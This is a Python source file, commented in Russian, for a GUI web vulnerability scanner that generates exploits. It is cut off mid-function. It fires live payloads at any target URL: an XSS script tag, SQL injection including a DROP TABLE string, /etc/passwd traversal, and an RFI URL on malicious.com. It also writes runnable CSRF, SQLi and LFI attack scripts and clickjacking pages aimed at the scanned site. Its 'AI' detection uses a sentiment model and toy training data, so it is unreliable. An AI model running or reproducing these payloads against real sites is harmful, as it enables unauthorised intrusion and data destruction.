import asyncio
import aiohttp
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, urlencode
from datetime import datetime
import re
import torch
from transformers import pipeline
import logging
import aiodns
import os
import platform
import json
import importlib.util
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import cross_val_score
import numpy as np
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import threading
import subprocess
import webbrowser
import sys
import sklearn

# Настройка логирования
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Проверка версии Python
if sys.version_info < (3, 7):
    logger.error("Требуется Python 3.7 или выше")
    exit(1)

# Логирование окружения
logger.debug(f"Python version: {sys.version}")
logger.debug(f"sys.path: {sys.path}")

# Настройка SelectorEventLoop для Windows
if platform.system() == "Windows":
    logger.debug("Windows detected, setting WindowsSelectorEventLoopPolicy")
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())


# Проверка зависимостей
def check_dependencies():
    required = ['aiohttp', 'requests', 'bs4', 'torch', 'transformers', 'aiodns', 'sklearn']
    missing = []
    for module in required:
        spec = importlib.util.find_spec(module)
        if not spec:
            missing.append(module)
        else:
            logger.debug(f"Модуль {module} найден: {spec.origin}")
    if missing:
        logger.error(
            f"Отсутствуют модули: {', '.join(missing)}. Установите их с помощью `pip install {' '.join(missing)}`.")
        messagebox.showerror("Ошибка",
                             f"Отсутствуют модули: {', '.join(missing)}. Установите их с помощью `pip install {' '.join(missing)}`.")
        exit(1)
    try:
        logger.info(f"scikit-learn version: {sklearn.__version__}")
    except Exception as e:
        logger.error(f"Ошибка проверки версии scikit-learn: {str(e)}")


check_dependencies()

# Инициализация ИИ-моделей
try:
    classifier = pipeline("text-classification", model="distilbert-base-uncased-finetuned-sst-2-english", device=-1)
    logger.info("ИИ-модель DistilBERT загружена успешно")
except Exception as e:
    logger.warning(f"Ошибка загрузки модели DistilBERT: {str(e)}. ИИ-анализ будет отключен.")
    classifier = None

# Расширенный тренировочный набор для Random Forest
training_data = {
    'features': [
        [1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0],  # XSS: script tag, no CSP
        [0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1],  # SQL-инъекция: SQL keywords, GET method
        [0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0],  # LFI: file parameter, no HTTPS
        [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],  # Безопасно: чистая страница
        [1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0],  # XSS + SQL: смешанные признаки
        [0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1],  # CSRF: no token, POST method
        [0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0],  # XSS: eval in script
        [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],  # Безопасно: чистая страница
        [1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1],  # XSS + LFI: script and file parameter
        [0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0],  # CSRF: no token, GET method
        [1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0],  # XSS: external script, no validation
        [0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 1],  # SQL-инъекция: error message, GET
        [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],  # Безопасно: чистая страница
        [1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0],  # XSS + SQL + CSRF: multiple issues
        [0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0],  # LFI: file inclusion attempt
        [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],  # Безопасно: чистая страница
        [1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0],  # XSS: script tag
        [0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1],  # SQL-инъекция: GET method
        [0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0],  # LFI: file parameter
        [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],  # Безопасно: чистая страница
    ],
    'labels': [1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0]
}

# Проверка целостности тренировочных данных
if len(training_data['features']) != len(training_data['labels']):
    logger.error(
        f"Несоответствие данных: {len(training_data['features'])} признаков, но {len(training_data['labels'])} меток")
    raise ValueError("Количество признаков и меток не совпадает")
for i, features in enumerate(training_data['features']):
    if len(features) != 14:
        logger.error(f"Ошибка в тренировочных данных: строка {i} имеет {len(features)} признаков вместо 14")
        raise ValueError(f"Неверное количество признаков в строке {i}")

# Инициализация и обучение Random Forest
rf_classifier = RandomForestClassifier(
    n_estimators=100,  # Увеличено количество деревьев
    max_depth=10,  # Ограничение глубины для предотвращения переобучения
    class_weight='balanced',  # Учет несбалансированности классов
    random_state=42
)
rf_classifier.fit(training_data['features'], training_data['labels'])

# Кросс-валидация для оценки модели
scores = cross_val_score(rf_classifier, training_data['features'], training_data['labels'], cv=5)
logger.info(f"Random Forest cross-validation scores: {scores}")
logger.info(f"Mean CV accuracy: {np.mean(scores):.2f} (+/- {np.std(scores) * 2:.2f})")

# Создание папки для PoC
POC_DIR = "pocs"
if not os.path.exists(POC_DIR):
    os.makedirs(POC_DIR)
    logger.debug(f"Создана директория {POC_DIR}")


# Функция для проверки валидности URL
def validate_url(url):
    try:
        result = requests.get(url, timeout=5)
        result.raise_for_status()
        logger.debug(f"URL {url} доступен")
        return True
    except requests.exceptions.RequestException as e:
        logger.error(f"Ошибка валидации URL {url}: {str(e)}")
        return f"Ошибка: {str(e)}"


# Функция для извлечения признаков для Random Forest
def extract_features(headers, content, soup, url):
    features = [
        1 if re.search(r'<script>|eval\(|document\.cookie', content, re.I) else 0,  # Подозрительные JS конструкции
        1 if re.search(r'sql|mysql|syntax|error', content, re.I) else 0,  # SQL ключевые слова
        0 if 'Content-Security-Policy' in headers else 1,  # Отсутствие CSP
        0 if 'X-Frame-Options' in headers else 1,  # Отсутствие X-Frame-Options
        0 if 'Strict-Transport-Security' in headers else 1,  # Отсутствие HSTS
        0 if urlparse(url).scheme == 'https' else 1,  # Не HTTPS
        1 if any(form.get('method', '').lower() == 'get' for form in soup.find_all('form')) else 0,  # GET формы
        1 if any(form.find('input', {'name': re.compile(r'file|path', re.I)}) for form in soup.find_all('form')) else 0,
        # Параметры file/path
        1 if re.search(r'admin|login|dashboard', content, re.I) else 0,  # Чувствительные ключевые слова
        1 if len(soup.find_all('script', src=re.compile(r'http://'))) > 0 else 0,  # Небезопасные внешние скрипты
        1 if any(inp.get('name') and not inp.get('pattern') for inp in soup.find_all('input', {'type': 'text'})) else 0,
        # Текстовые поля без валидации
        1 if 'Server' in headers and re.search(r'apache/2\.[0-2]|nginx/1\.[0-9]\.', headers['Server'], re.I) else 0,
        # Устаревший сервер
        1 if re.search(r'jQuery|angular|react', content, re.I) else 0,  # Наличие популярных библиотек
        1 if len(soup.find_all('input', {'type': 'password'})) > 0 else 0  # Поля пароля
    ]
    logger.debug(f"Extracted features for Random Forest: {features}")
    return features


# Функция для анализа заголовков безопасности
def check_security_headers(headers):
    vulnerabilities = []
    if 'X-Frame-Options' not in headers:
        vulnerabilities.append("Отсутствует заголовок X-Frame-Options (уязвимость к кликджекингу)")
    if 'Content-Security-Policy' not in headers:
        vulnerabilities.append("Отсутствует заголовок Content-Security-Policy (риск XSS)")
    if 'Strict-Transport-Security' not in headers:
        vulnerabilities.append("Отсутствует заголовок Strict-Transport-Security (риск атак MITM)")
    if 'X-Content-Type-Options' not in headers:
        vulnerabilities.append("Отсутствует заголовок X-Content-Type-Options (риск MIME-типа)")
    return vulnerabilities


# Функция для проверки HTTPS
def check_https(url):
    parsed = urlparse(url)
    if parsed.scheme != 'https':
        return ["Сайт использует HTTP вместо HTTPS (риск перехвата данных)"]
    return []


# Функция для проверки cookies
def check_cookies(response):
    vulnerabilities = []
    cookies = response.cookies
    for cookie in cookies:
        if not cookie.secure:
            vulnerabilities.append(f"Cookie '{cookie.name}' не имеет флага Secure (риск перехвата)")
        if not cookie.has_nonstandard_attr('HttpOnly'):
            vulnerabilities.append(f"Cookie '{cookie.name}' не имеет флага HttpOnly (риск XSS)")
    return vulnerabilities


# Функция для проверки robots.txt и sitemap.xml
async def check_robots_sitemap(url, session):
    vulnerabilities = []
    try:
        async with session.get(f"{url}/robots.txt") as response:
            if response.status != 200:
                vulnerabilities.append("Файл robots.txt отсутствует или недоступен")
    except:
        vulnerabilities.append("Ошибка при проверке robots.txt")
    try:
        async with session.get(f"{url}/sitemap.xml") as response:
            if response.status != 200:
                vulnerabilities.append("Файл sitemap.xml отсутствует или недоступен")
    except:
        vulnerabilities.append("Ошибка при проверке sitemap.xml")
    return vulnerabilities


# Функция для анализа форм (XSS, CSRF)
async def analyze_forms(soup, url, session):
    vulnerabilities = []
    forms = soup.find_all('form')
    for form in forms:
        action = urljoin(url, form.get('action', ''))
        method = form.get('method', 'get').lower()
        if method == 'post':
            form_data = {}
            inputs = form.find_all('input')
            for inp in inputs:
                name = inp.get('name')
                value = inp.get('value', 'test_value')
                if name and name.lower() not in ['csrf', 'token']:
                    form_data[name] = value
            if not form.find('input', {'name': re.compile(r'csrf|token', re.I)}):
                if form_data:
                    vulnerabilities.append(
                        f"Форма на {action} не содержит CSRF-токена (риск CSRF-атаки, параметры: {json.dumps(form_data)})")
            inputs = form.find_all('input', {'type': 'text'})
            for inp in inputs:
                name = inp.get('name', 'test')
                if not inp.get('pattern') and not inp.get('maxlength'):
                    payload = "<script>alert('XSS')</script>"
                    data = {name: payload}
                    try:
                        if method == 'post':
                            async with session.post(action, data=data) as response:
                                content = await response.text()
                                if payload in content:
                                    vulnerabilities.append(
                                        f"Обнаружена XSS-уязвимость в форме на {action} (payload: {payload})")
                        else:
                            params = urlencode(data)
                            async with session.get(f"{action}?{params}") as response:
                                content = await response.text()
                                if payload in content:
                                    vulnerabilities.append(
                                        f"Обнаружена XSS-уязвимость в форме на {action} (payload: {payload})")
                    except:
                        pass
        else:
            vulnerabilities.append(f"Форма на {action} использует GET вместо POST (риск утечки данных)")
    return vulnerabilities


# Функция для проверки SQL-инъекций
async def check_sql_injection(url, session):
    vulnerabilities = []
    payloads = ["' OR 1=1 --", "'; DROP TABLE users; --"]
    for payload in payloads:
        try:
            params = {'id': payload, 'q': payload}
            async with session.get(url, params=params) as response:
                content = await response.text()
                if re.search(r'sql|mysql|syntax|error', content, re.I):
                    vulnerabilities.append(f"Обнаружена потенциальная SQL-инъекция на {url} (payload: {payload})")
        except:
            pass
    return vulnerabilities


# Функция для проверки LFI/RFI
async def check_lfi_rfi(url, session):
    vulnerabilities = []
    payloads = ["../../etc/passwd", "http://malicious.com/shell.txt"]
    for payload in payloads:
        try:
            params = {'file': payload, 'page': payload}
            async with session.get(url, params=params) as response:
                content = await response.text()
                if re.search(r'root:.*:0:0|malicious', content, re.I):
                    vulnerabilities.append(f"Обнаружена LFI/RFI-уязвимость на {url} (payload: {payload})")
        except:
            pass
    return vulnerabilities


# Обновленная функция ИИ-анализа
def ai_analyze_content(content, headers, soup, url):
    vulnerabilities = []
    features = extract_features(headers, content, soup, url)
    prediction = rf_classifier.predict([features])[0]
    probabilities = rf_classifier.predict_proba([features])[0]
    logger.info(f"Random Forest prediction: {prediction}, probabilities: {probabilities}")

    # Всегда добавляем результат Random Forest
    vulnerabilities.append(
        f"Random Forest: {'Обнаружена потенциальная уязвимость' if prediction == 1 else 'Страница выглядит безопасной'} "
        f"(уверенность: {probabilities[1]:.2f})"
    )

    # Проверка DistilBERT
    if classifier:
        try:
            text = soup.get_text(separator=' ', strip=True)[:512]
            logger.debug(f"Text for DistilBERT: {text[:100]}...")
            result = classifier(text)
            logger.info(f"DistilBERT result: {result}")
            vulnerabilities.append(
                f"BERT: {'Подозрительное содержимое' if result[0]['label'] == 'NEGATIVE' and result[0]['score'] > 0.7 else 'Содержимое выглядит безопасным'} "
                f"(уверенность: {result[0]['score']:.2f})"
            )
            if re.search(r'password|admin|login|eval\(|document\.cookie', text, re.I):
                vulnerabilities.append("BERT: Потенциально уязвимый код")
        except Exception as e:
            logger.error(f"Ошибка BERT-анализа: {str(e)}")
            vulnerabilities.append(f"BERT: Ошибка анализа ({str(e)})")

    return vulnerabilities


# Анализ JavaScript
def analyze_javascript(soup, url):
    vulnerabilities = []
    scripts = soup.find_all('script')
    for script in scripts:
        src = script.get('src')
        if src and 'http://' in src:
            vulnerabilities.append(f"Небезопасный внешний скрипт на {url}: {src}")
        if script.string:
            if 'eval(' in script.string:
                vulnerabilities.append(f"Использование eval() на {url}")
            if re.search(r'jQuery|angular|react', script.string, re.I):
                vulnerabilities.append(f"Обнаружена библиотека на {url} (проверьте версию)")
    return vulnerabilities


# Проверка конфигурации сервера
def check_server_config(headers):
    vulnerabilities = []
    server = headers.get('Server', '')
    if server and re.search(r'apache/2\.[0-2]|nginx/1\.[0-9]\.', server, re.I):
        vulnerabilities.append("Устаревшая версия сервера")
    return vulnerabilities


# Проверка CORS
async def check_cors(url, session):
    vulnerabilities = []
    try:
        headers = {'Origin': 'http://malicious.com'}
        async with session.get(url, headers=headers) as response:
            if 'Access-Control-Allow-Origin' in response.headers and response.headers[
                'Access-Control-Allow-Origin'] == '*':
                vulnerabilities.append(f"Небезопасная CORS-политика на {url}")
    except:
        pass
    return vulnerabilities


# Поиск субдоменов
async def find_subdomains(domain):
    subdomains = []
    common_subdomains = ['www', 'mail', 'api', 'admin']
    resolver = aiodns.DNSResolver()
    for sub in common_subdomains:
        try:
            subdomain = f"{sub}.{domain}"
            await resolver.query(subdomain, 'A')
            subdomains.append(subdomain)
        except:
            pass
    return subdomains


# Генерация эксплойтов и PoC
def generate_exploits(vulnerabilities, base_url):
    logger.debug(f"Генерация эксплойтов для {base_url}")
    exploits = []
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    parsed_url = urlparse(base_url)
    netloc = parsed_url.netloc.replace('.', '_')

    for index, vuln in enumerate(vulnerabilities, 1):
        poc_filename = None
        poc_instructions = None
        logger.debug(f"Обработка уязвимости: {vuln}")

        if "X-Frame-Options" in vuln:
            poc_filename = f"{POC_DIR}/clickjacking_poc_{index}_{netloc}_{timestamp}.html"
            poc_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Clickjacking PoC</title>
    <style>
        #target_iframe {{ width: 100%; height: 600px; opacity: 0.8; position: absolute; top: 0; left: 0; }}
        #trap {{ position: absolute; top: 200px; left: 50px; width: 200px; height: 50px; background-color: red; color: white; text-align: center; line-height: 50px; cursor: pointer; z-index: 10; opacity: 0.5; }}
    </style>
</head>
<body>
    <h1>Clickjacking Proof of Concept</h1>
    <p>Нажмите на красную кнопку, чтобы "выиграть приз".</p>
    <div id="trap">Нажми, чтобы выиграть!</div>
    <iframe id="target_iframe" src="{base_url}"></iframe>
</body>
</html>"""
            try:
                with open(poc_filename, 'w', encoding='utf-8') as f:
                    f.write(poc_content)
                poc_instructions = f"""PoC: {poc_filename}
Инструкции:
1. Откройте файл в браузере.
2. Нажмите на красную кнопку.
3. Если клик взаимодействует с сайтом, уязвимость подтверждена."""
            except Exception as e:
                logger.error(f"Ошибка записи {poc_filename}: {str(e)}")
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Внедрение сайта в iframe для кликджекинга.",
                "example": f"<iframe src='{base_url}'></iframe>",
                "poc": poc_instructions,
                "poc_file": poc_filename,
                "recommendation": "Настройте X-Frame-Options: DENY или SAMEORIGIN."
            })

        elif "Content-Security-Policy" in vuln:
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Внедрение вредоносных скриптов через XSS.",
                "example": "<script>alert('XSS')</script>",
                "poc": "PoC: Внедрите XSS через уязвимую форму.",
                "recommendation": "Настройте CSP, например, 'default-src 'self''."
            })

        elif "Strict-Transport-Security" in vuln:
            exploits.append({
                "vulnerability": vuln,
                "exploit": "MITM-атака с подменой HTTPS на HTTP.",
                "example": "Перехват трафика через Wireshark.",
                "poc": "PoC: Используйте сниффер в незащищенной сети.",
                "recommendation": "Настройте HSTS с max-age=31536000."
            })

        elif "X-Content-Type-Options" in vuln:
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Неверная интерпретация MIME-типов, ведущая к XSS.",
                "example": "Загрузка скрипта как HTML.",
                "poc": "PoC: Внедрите XSS через неверный MIME-тип.",
                "recommendation": "Настройте X-Content-Type-Options: nosniff."
            })

        elif "HTTP вместо HTTPS" in vuln:
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Перехват данных в незащищенной сети.",
                "example": "Сниффинг через Wi-Fi.",
                "poc": f"PoC: Используйте Wireshark для перехвата трафика на `{base_url}`.",
                "recommendation": "Внедрите HTTPS и SSL-сертификат."
            })

        elif "Cookie" in vuln:
            poc_filename = f"{POC_DIR}/cookie_poc_{index}_{netloc}_{timestamp}.html"
            poc_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cookie PoC</title>
    <script>
        function stealCookies() {{
            alert("Cookies: " + document.cookie);
        }}
    </script>
</head>
<body>
    <h1>Cookie Proof of Concept</h1>
    <p>Нажмите кнопку, чтобы проверить доступ к cookies.</p>
    <button onclick="stealCookies()">Получить Cookies</button>
    <p>Откройте в контексте `{base_url}` (например, через XSS).</p>
</body>
</html>"""
            try:
                with open(poc_filename, 'w', encoding='utf-8') as f:
                    f.write(poc_content)
                poc_instructions = f"""PoC: {poc_filename}
Инструкции:
1. Откройте файл в браузере.
2. Нажмите кнопку "Получить Cookies".
3. Если cookies отображаются, уязвимость подтверждена."""
            except Exception as e:
                logger.error(f"Ошибка записи {poc_filename}: {str(e)}")
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Перехват cookie или XSS для кражи сессии.",
                "example": "document.cookie",
                "poc": poc_instructions,
                "poc_file": poc_filename,
                "recommendation": "Установите флаги Secure и HttpOnly."
            })

        elif "robots.txt" in vuln:
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Индексация чувствительных страниц.",
                "example": "Google индексирует /admin.",
                "poc": f"PoC: Перейдите на `{base_url}/robots.txt`. Ошибка 404 подтверждает уязвимость.",
                "recommendation": "Создайте robots.txt с Disallow."
            })

        elif "sitemap.xml" in vuln:
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Усложняет индексацию.",
                "example": "Поисковики пропускают страницы.",
                "poc": f"PoC: Перейдите на `{base_url}/sitemap.xml`. Ошибка 404 подтверждает уязвимость.",
                "recommendation": "Создайте sitemap.xml."
            })

        elif "CSRF" in vuln:
            url_match = re.search(r'на (https?://[^\s]+)', vuln)
            vuln_url = url_match.group(1).strip() if url_match else base_url
            params_match = re.search(r'параметры: (\{.*?\})', vuln)
            form_params = json.loads(params_match.group(1)) if params_match else {'test_param': 'csrf_test'}
            poc_filename = f"{POC_DIR}/csrf_poc_{index}_{netloc}_{timestamp}.py"
            form_data_str = ", ".join([f"'{k}': '{v}'" for k, v in form_params.items()])
            poc_content = f"""import requests
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

url = r'{vuln_url}'
data = {{{form_data_str}}}
headers = {{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}}
try:
    session = requests.Session()
    initial_response = session.get(url, headers=headers, timeout=5)
    logger.info(f"Начальная проверка URL: {{url}}, код ответа: {{initial_response.status_code}}")
    if not session.cookies:
        print("Внимание: Cookies сессии не обнаружены. Убедитесь, что вы авторизованы на сайте!")
    logger.info(f"Отправка CSRF-запроса на {{url}} с параметрами {{data}}")
    response = session.post(url, data=data, headers=headers, timeout=10, allow_redirects=True)
    if response.status_code in [200, 302, 303]:
        print("CSRF запрос отправлен успешно!")
        print("Код ответа:", response.status_code)
        print("Ответ сервера (первые 500 символов):", response.text[:500])
        print("Cookies сессии:", session.cookies.get_dict())
        print("Проверьте, изменилось ли состояние на сайте (например, обновились ли данные).")
    else:
        print(f"CSRF запрос завершился ошибкой. Код ответа: {{response.status_code}}")
        print("Ответ сервера:", response.text[:500])
except Exception as e:
    print("Ошибка выполнения CSRF запроса:", str(e))
    print("Примечание: Проверьте доступность сайта и убедитесь, что вы авторизованы.")
"""
            try:
                with open(poc_filename, 'w', encoding='utf-8') as f:
                    f.write(poc_content)
                poc_instructions = f"""PoC: {poc_filename}
Инструкции:
1. Убедитесь, что вы вошли в аккаунт на сайте `{vuln_url}` в браузере.
2. Запустите скрипт через UI (двойной клик) или командой: `python {poc_filename}`.
3. Проверьте вывод в UI или консоли.
4. Если запрос успешен, проверьте сайт на изменения (например, данные пользователя).
5. Если ошибка, убедитесь, что сайт доступен и вы авторизованы."""
            except Exception as e:
                logger.error(f"Ошибка записи {poc_filename}: {str(e)}")
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Отправка поддельного запроса от имени пользователя.",
                "example": f"POST-запрос на {vuln_url} с параметрами {form_params}",
                "poc": poc_instructions,
                "poc_file": poc_filename,
                "recommendation": "Внедрите CSRF-токены."
            })
            html_poc_filename = f"{POC_DIR}/csrf_html_{index}_{netloc}_{timestamp}.html"
            form_inputs = "".join([f'<input type="hidden" name="{k}" value="{v}">' for k, v in form_params.items()])
            html_poc_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC (HTML)</title>
    <script>
        function testCSRF() {{
            document.getElementById('result').innerText = 'Отправка запроса...';
            document.forms[0].submit();
            setTimeout(() => {{
                document.getElementById('result').innerText = 'Запрос отправлен. Проверьте сайт на изменения.';
            }}, 1000);
        }}
    </script>
</head>
<body>
    <h1>CSRF Proof of Concept (HTML)</h1>
    <p>Эта страница тестирует CSRF-уязвимость на <code>{vuln_url}</code>.</p>
    <p>Убедитесь, что вы вошли в аккаунт на сайте в этом браузере.</p>
    <button onclick="testCSRF()">Отправить CSRF запрос</button>
    <p>Результат: <span id="result">Ожидание действия...</span></p>
    <form id="csrf_form" action="{vuln_url}" method="POST">
        {form_inputs}
    </form>
    <p>Инструкции:</p>
    <ol>
        <li>Войдите на сайт `{vuln_url}` в этом браузере.</li>
        <li>Нажмите кнопку "Отправить CSRF запрос".</li>
        <li>Проверьте, изменилось ли состояние на сайте.</li>
        <li>Если изменений нет, проверьте параметры формы в `vulnerabilities.log`.</li>
    </ol>
</body>
</html>"""
            try:
                with open(html_poc_filename, 'w', encoding='utf-8') as f:
                    f.write(html_poc_content)
                html_poc_instructions = f"""PoC: {html_poc_filename}
Инструкции:
1. Убедитесь, что вы вошли на сайт `{vuln_url}` в этом браузере.
2. Откройте файл в браузере.
3. Нажмите кнопку "Отправить CSRF запрос".
4. Проверьте, изменилось ли состояние на сайте.
5. Если изменений нет, проверьте параметры формы в `vulnerabilities.log`."""
            except Exception as e:
                logger.error(f"Ошибка записи {html_poc_filename}: {str(e)}")
            exploits.append({
                "vulnerability": vuln + " (HTML PoC)",
                "exploit": "Отправка поддельного запроса через форму.",
                "example": f"<form action='{vuln_url}' method='POST'>{form_inputs}</form>",
                "poc": html_poc_instructions,
                "poc_file": html_poc_filename,
                "recommendation": "Внедрите CSRF-токены."
            })

        elif "GET вместо POST" in vuln:
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Утечка данных через URL или историю браузера.",
                "example": "Параметры в query string.",
                "poc": f"PoC: Проверьте форму на `{base_url}`. Если данные видны в URL, уязвимость подтверждена.",
                "recommendation": "Используйте POST для форм."
            })

        elif "XSS" in vuln:
            payload_match = re.search(r'payload: (.+)', vuln)
            payload = payload_match.group(1).strip() if payload_match else "<script>alert('XSS')</script>"
            vuln_url_match = re.search(r'на (.+?) \(', vuln)
            vuln_url = vuln_url_match.group(1).strip() if vuln_url_match else base_url
            poc_filename = f"{POC_DIR}/xss_poc_{index}_{netloc}_{timestamp}.html"
            poc_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>XSS PoC</title>
</head>
<body>
    <h1>XSS PoC</h1>
    <p>Нажмите на ссылку, чтобы протестировать XSS.</p>
    <a href="{vuln_url}?q={urlencode({'q': payload})}" target="_blank">Тест XSS</a>
    <p>Или вставьте в браузер:</p>
    <code>{vuln_url}?q={urlencode({'q': payload})}</code>
</body>
</html>"""
            try:
                with open(poc_filename, 'w', encoding='utf-8') as f:
                    f.write(poc_content)
                poc_instructions = f"""PoC: {poc_filename}
Инструкции:
1. Откройте файл в браузере.
2. Нажмите на ссылку "Тест XSS".
3. Если появляется всплывающее окно, уязвимость подтверждена."""
            except Exception as e:
                logger.error(f"Ошибка записи {poc_filename}: {str(e)}")
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Внедрение скрипта в поле ввода.",
                "example": payload,
                "poc": poc_instructions,
                "poc_file": poc_filename,
                "recommendation": "Валидируйте и экранируйте ввод."
            })

        elif "SQL-инъекция" in vuln:
            payload_match = re.search(r'payload: (.+)', vuln)
            payload = payload_match.group(1).strip() if payload_match else "' OR 1=1 --"
            url_match = re.search(r'(https?://[^\s]+)', vuln)
            vuln_url = url_match.group(1).strip() if url_match else base_url
            poc_filename = f"{POC_DIR}/sqli_poc_{index}_{netloc}_{timestamp}.py"
            poc_content = f"""import requests

url = "{vuln_url}"
params = {{'id': "{payload}", 'q': "{payload}"}}
try:
    response = requests.get(url, params=params, timeout=5)
    if any(x in response.text.lower() for x in ['sql', 'mysql', 'syntax', 'error']):
        print("SQL-инъекция выполнена успешно!")
        print("Ответ сервера:", response.text[:500])
    else:
        print("SQL-инъекция не подтверждена.")
except Exception as e:
    print("Ошибка:", str(e))
"""
            try:
                with open(poc_filename, 'w', encoding='utf-8') as f:
                    f.write(poc_content)
                poc_instructions = f"""PoC: {poc_filename}
Инструкции:
1. Запустите скрипт: `python {poc_filename}`.
2. Проверьте консоль.
3. Ожидаемый результат: Сообщение "SQL-инъекция выполнена успешно!"."""
            except Exception as e:
                logger.error(f"Ошибка записи {poc_filename}: {str(e)}")
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Манипуляция базой данных.",
                "example": payload,
                "poc": poc_instructions,
                "poc_file": poc_filename,
                "recommendation": "Используйте параметризованные запросы."
            })

        elif "LFI/RFI" in vuln:
            payload_match = re.search(r'payload: (.+)', vuln)
            payload = payload_match.group(1).strip() if payload_match else "../../etc/passwd"
            vuln_url_match = re.search(r'на (.+?) \(', vuln)
            vuln_url = vuln_url_match.group(1).strip() if vuln_url_match else base_url
            poc_filename = f"{POC_DIR}/lfi_rfi_poc_{index}_{netloc}_{timestamp}.py"
            poc_content = f"""import requests

url = "{vuln_url}"
params = {{'file': "{payload}", 'page': "{payload}"}}
try:
    response = requests.get(url, params=params, timeout=5)
    if any(x in response.text.lower() for x in ['root:', 'passwd', 'malicious']):
        print("LFI/RFI выполнена успешно!")
        print("Ответ сервера:", response.text[:500])
    else:
        print("LFI/RFI не подтверждена.")
except Exception as e:
    print("Ошибка:", str(e))
"""
            try:
                with open(poc_filename, 'w', encoding='utf-8') as f:
                    f.write(poc_content)
                poc_instructions = f"""PoC: {poc_filename}
Инструкции:
1. Запустите скрипт: `python {poc_filename}`.
2. Проверьте консоль.
3. Ожидаемый результат: Сообщение "LFI/RFI выполнена успешно!"."""
            except Exception as e:
                logger.error(f"Ошибка записи {poc_filename}: {str(e)}")
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Доступ к файлам сервера или внедрение кода.",
                "example": payload,
                "poc": poc_instructions,
                "poc_file": poc_filename,
                "recommendation": "Фильтруйте параметры запроса."
            })

        elif "подозрительное содержимое" in vuln or "Random Forest" in vuln:
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Возможный вредоносный код.",
                "example": "Неизвестный скрипт.",
                "poc": f"PoC: Проведите ручной аудит кода на `{base_url}`.",
                "recommendation": "Проведите аудит кода."
            })

        elif "eval()" in vuln:
            poc_filename = f"{POC_DIR}/eval_poc_{index}_{netloc}_{timestamp}.html"
            poc_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Eval PoC</title>
    <script>
        function exploitEval() {{
            eval('alert("Эксплуатация eval(): Произвольный код выполнен!")');
        }}
    </script>
</head>
<body>
    <h1>Eval Proof of Concept</h1>
    <p>Нажмите кнопку, чтобы сымитировать eval().</p>
    <button onclick="exploitEval()">Тест Eval</button>
    <p>Внедрите через XSS на `{base_url}`.</p>
</body>
</html>"""
            try:
                with open(poc_filename, 'w', encoding='utf-8') as f:
                    f.write(poc_content)
                poc_instructions = f"""PoC: {poc_filename}
Инструкции:
1. Откройте файл в браузере.
2. Нажмите кнопку "Тест Eval".
3. Если появляется всплывающее окно, опасность eval() подтверждена."""
            except Exception as e:
                logger.error(f"Ошибка записи {poc_filename}: {str(e)}")
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Внедрение произвольного кода.",
                "example": "eval('malicious_code')",
                "poc": poc_instructions,
                "poc_file": poc_filename,
                "recommendation": "Удалите eval()."
            })

        elif "Небезопасный внешний скрипт" in vuln:
            exploits.append({
                "vulnerability": vuln,
                "exploit": "Компрометация внешнего ресурса.",
                "example": "MITM-атака на HTTP-скрипт.",
                "poc": f"PoC: Проверьте исходный код страницы на `{base_url}` для HTTP-скриптов.",
                "recommendation": "Используйте HTTPS и проверяйте целостность."
            })

        elif "библиотека" in vuln:
